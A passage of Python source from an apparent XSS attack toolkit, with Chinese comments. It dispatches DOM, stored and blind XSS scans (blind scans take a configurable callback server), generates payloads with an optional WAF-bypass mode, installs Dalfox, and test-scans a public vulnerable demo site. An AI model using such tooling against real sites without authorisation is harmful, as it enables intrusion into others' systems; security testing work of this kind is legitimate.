            elif command == "dom_scan":
                target_url = parameters.get('target_url')
                if not target_url:
                    return {"success": False, "error": "Missing target_url parameter"}
                
                target = self.manager._parse_target(target_url, parameters.get('options', {}))
                vulns = await self.manager.dom_detector.scan_dom_xss(target)
                return {"success": True, "data": [asdict(v) for v in vulns]}
            
            elif command == "stored_scan":
                target_url = parameters.get('target_url')
                if not target_url:
                    return {"success": False, "error": "Missing target_url parameter"}
                
                target = self.manager._parse_target(target_url, parameters.get('options', {}))
                vulns = await self.manager.stored_detector.scan_stored_xss(target)
                return {"success": True, "data": [asdict(v) for v in vulns]}
            
            elif command == "blind_scan":
                target_url = parameters.get('target_url')
                if not target_url:
                    return {"success": False, "error": "Missing target_url parameter"}
                
                callback_server = parameters.get('callback_server')
                if callback_server:
                    self.manager.blind_detector.callback_server = callback_server
                
                target = self.manager._parse_target(target_url, parameters.get('options', {}))
                vulns = await self.manager.blind_detector.scan_blind_xss(target)
                return {"success": True, "data": [asdict(v) for v in vulns]}
            
            elif command == "generate_payloads":
                xss_type = parameters.get('xss_type', 'basic_reflected')
                context = parameters.get('context', 'html_context')
                waf_bypass = parameters.get('waf_bypass', False)
                
                payloads = self.manager.payload_generator.generate_payloads(xss_type, context, waf_bypass)
                return {"success": True, "data": {"payloads": payloads}}
            
            elif command == "install_dalfox":
                success = await self.manager.dalfox.install_dalfox()
                return {"success": success, "message": "Dalfox installation completed" if success else "Dalfox installation failed"}
            
            else:
                return {"success": False, "error": f"Unknown command: {command}"}
                
        except Exception as e:
            logger.error(f"命令執行失敗: {e}")
            return {"success": False, "error": str(e)}
    
    async def cleanup(self) -> bool:
        """清理資源"""
        try:
            self.manager.scan_results.clear()
            return True
        except Exception as e:
            logger.error(f"清理失敗: {e}")
            return False


# 註冊能力
CapabilityRegistry.register("xss_attack_tools", XSSCapability)


if __name__ == "__main__":
    # 測試用例
    async def test_xss_tools():
        capability = XSSCapability()
        await capability.initialize()
        
        # 測試綜合掃描
        result = await capability.execute("comprehensive_scan", {
            "target_url": "http://testhtml5.vulnweb.com/",
            "options": {
                "use_dalfox": True,
                "scan_dom": True,
                "scan_stored": True,
                "custom_scan": True
            }
        })
        
        console.print(json.dumps(result, indent=2, ensure_ascii=False))
        
        await capability.cleanup()
    
    # 運行測試
    asyncio.run(test_xss_tools())